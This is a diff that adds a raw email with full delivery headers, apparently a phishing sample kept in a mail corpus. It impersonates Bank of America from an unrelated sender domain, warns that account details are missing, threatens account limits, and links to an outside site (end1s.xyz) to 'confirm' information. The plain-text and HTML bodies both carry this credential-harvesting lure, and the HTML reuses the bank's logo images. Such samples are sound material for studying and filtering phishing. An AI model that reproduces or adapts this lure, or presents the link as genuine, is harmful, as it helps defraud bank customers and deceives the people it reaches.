@@ -1,0 +1,125 @@
+Return-Path: <boasecurity@goldinalsincz.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id C5A6CF4132
+	for <jose@login.monkey.org>; Thu, 28 May 2015 10:19:29 -0500 (CDT)
+Received: from smtpin13.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay02.b.hostedemail.com (Postfix) with SMTP id 7C02E27AC2A
+	for <jose@login.monkey.org>; Thu, 28 May 2015 15:19:29 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70236669258.13.pain04_35af868d90002
+Authentication-Results: auth.b.hostedemail.com; dkim=pass
+	reason="1024-bit key; insecure key"
+	header.d=goldinalsincz.com header.i=@goldinalsincz.com
+	header.b=n3wh0Tn/; dkim-adsp=pass; dkim-atps=neutral
+X-Spam-Summary: 2,0,0,02e14e3e4f018d63,d41d8cd98f00b204,boasecurity@goldinalsincz.com,,RULES_HIT:41:72:152:355:379:962:967:973:978:983:988:989:1189:1208:1212:1221:1260:1313:1314:1345:1431:1432:1437:1516:1517:1518:1534:1542:1546:1575:1589:1594:1711:1730:1776:1792:1803:2068:2069:2198:2199:2525:2538:2557:2559:2565:2570:2682:2685:2703:2820:2859:2890:2892:2898:2902:2909:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3352:3769:3865:3866:3867:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:3976:4042:4321:4362:5007:6117:6119:6248:6261:7801:7903:8603:8957:8985:9025:9388:10049:10305:10400:10429:10430:10431:11245:11289:11658:12217:12219:12812:13139:13156:13163:13228:13229,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:3:0
+X-HE-Tag: pain04_35af868d90002
+X-Filterd-Recvd-Size: 4925
+Received: from s102.avahost.net (s102.avahost.net [174.34.252.13])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 28 May 2015 15:19:28 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=goldinalsincz.com; s=default;
+	h=Message-ID:Subject:To:From:Date:Content-Type:MIME-Version; bh=AUFn4b/vY7YTqPxPiTC0ASfgtyAK9vvnkgxuX56hHzg=;
+	b=n3wh0Tn/k5+Et5Uko1ZIMjFSNbiPud9RHOLX6kHV7AQ/1ylA1bLb/VckZdHdoDM2QQyzqPAqDrYEpJfb7FkNm3nNhF9u71d6jScYMDLHIlve3/vOXpW7d0LUT7Jh6F+rc4lAa6p06jGN+OS+iWO+6RSDM5qYWCQmr4HNrCEwd7U=;
+Received: from localhost ([::1]:38966 helo=goldinalsincz.com)
+	by s102.avahost.net with esmtpa (Exim 4.85)
+	(envelope-from <boasecurity@goldinalsincz.com>)
+	id 1YxzW8-003kVe-Vs; Thu, 28 May 2015 11:14:45 -0400
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="=_b6f26ee2ee43f3df0310b4fad329e504"
+Date: Thu, 28 May 2015 11:14:44 -0400
+From: Bank Of America <boasecurity@goldinalsincz.com>
+To: undisclosed-recipients:;
+Subject: BOA - Online Security Alert !
+Message-ID: <681b832ba61ad3122b22828bac8a123d@goldinalsincz.com>
+X-Sender: boasecurity@goldinalsincz.com
+User-Agent: Roundcube Webmail/1.0.5
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - s102.avahost.net
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - goldinalsincz.com
+X-Get-Message-Sender-Via: s102.avahost.net: authenticated_id: boasecurity@goldinalsincz.com
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 93
+
+--=_b6f26ee2ee43f3df0310b4fad329e504
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=US-ASCII
+
+ 
+
+Important Notice Warning, 
+
+Some information on your account appears to be missing or incorrect. 
+
+Please confirm your information promptly so that you can continue to
+enjoy all the benefits of your Bank Of America account. 
+
+If you don't confirm your information, we'll limit what you can do with
+your Bank Of America account. 
+
+Here's a link to all the legal details 
+
+http://end1s.xyz/boamerica_confirmation [1] 
+
+Thank you for being a Bank Of America customer. 
+
+Please do not reply to this email. We are unable to respond to inquiries
+sent to this address. For immediate answers to your questions, visit our
+Help Center by clicking "Help" located on any Bank Of America page or
+email.
+
+Copyright (c) 2015. 
+ 
+
+Links:
+------
+[1] http://end1s.xyz/boamerica_confirmation
+
+--=_b6f26ee2ee43f3df0310b4fad329e504
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN">
+<html><body style=3D'font-size: 10pt; font-family: Verdana,Geneva,sans-seri=
+f'>
+<p><img src=3D"https://ci6.googleusercontent.com/proxy/q-ufWa1CxKdSR7O_4S4V=
+a6FJMC-kqsJfzYH4-cJ2sJ6H4zxlVPWzKGtDQMQDgx_0B1n6FIxd3YL8auPJPqac5WxopQR5ZWd=
+jDaz3egdpbn_Kf2QON64Mn7AzFh8WU-VXTFV7LZV-Klq2rHR74-Ds1EUc=3Ds0-d-e1-ft#http=
+s://www.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US=
+/boa_logo.gif" alt=3D"region" width=3D"225" height=3D"28" border=3D"0" /><b=
+r /><br />Important Notice&nbsp;<img src=3D"https://ci5.googleusercontent=
+=2Ecom/proxy/pYu6qT4VYIGhMSqlzUukV08JXlSSrS4oYzc2S75ziBnmMoE_UhxCfFAOwopY8d=
+S2uUOiZmRjjj0uYduAVT1a_QDtFsMH1XmzGmd1unmzuEcw-MK9Ncagn2NNUkliCXvIskRDfsZsr=
+_MX0ym4XKJaoe0n5A=3Ds0-d-e1-ft#https://image.paypal-communication.com/paypa=
+l_na/2014/20131210_Templates_22725/img_spacer.gif" alt=3D"" width=3D"1" hei=
+ght=3D"12" border=3D"0" />&nbsp;Warning,&nbsp;<img src=3D"https://ci5.googl=
+eusercontent.com/proxy/pYu6qT4VYIGhMSqlzUukV08JXlSSrS4oYzc2S75ziBnmMoE_UhxC=
+fFAOwopY8dS2uUOiZmRjjj0uYduAVT1a_QDtFsMH1XmzGmd1unmzuEcw-MK9Ncagn2NNUkliCXv=
+IskRDfsZsr_MX0ym4XKJaoe0n5A=3Ds0-d-e1-ft#https://image.paypal-communication=
+=2Ecom/paypal_na/2014/20131210_Templates_22725/img_spacer.gif" alt=3D"" wid=
+th=3D"1" height=3D"18" border=3D"0" /></p>
+<p>Some information on your account appears to be missing or incorrect.</p>
+<p>Please confirm your information promptly so that you can continue to enj=
+oy all the benefits of your Bank Of America account.</p>
+<p>If you don't confirm your information, we'll limit what you can do with =
+your Bank Of America account.</p>
+<p>Here's a link to all the legal details</p>
+<p><a href=3D"http://end1s.xyz/boamerica_confirmation" target=3D"_blank">ht=
+tp://end1s.xyz/boamerica_confirmation</a></p>
+<p>Thank you for being a Bank Of America customer.</p>
+<p>&nbsp;</p>
+<p>Please do not reply to this email. We are unable to respond to inquiries=
+ sent to this address. For immediate answers to your questions, visit our H=
+elp Center by clicking "Help" located on any Bank Of America page or email=
+=2E<br /><br />Copyright &copy; 2015.</p>
+<div>&nbsp;</div>
+</body></html>
+
+--=_b6f26ee2ee43f3df0310b4fad329e504--
